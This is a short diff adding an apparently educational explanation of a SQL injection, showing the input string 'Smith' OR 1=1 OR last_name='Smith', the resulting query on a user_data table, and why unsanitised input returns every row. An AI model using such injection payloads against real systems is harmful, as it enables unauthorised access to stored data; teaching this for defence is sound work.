@@ -1,0 +1,7 @@
+Smith' OR 1=1 OR last_name='Smith
+
+The above line results in the following SQL command to be executed:
+
+SELECT * FROM user_data WHERE last_name = 'Smith' OR 1=1 OR last_name='Smith';
+
+This exploit takes advantage of the lack of form input sanitisation to insert an always true statement into the select command, causing all table entries to be retrieved.
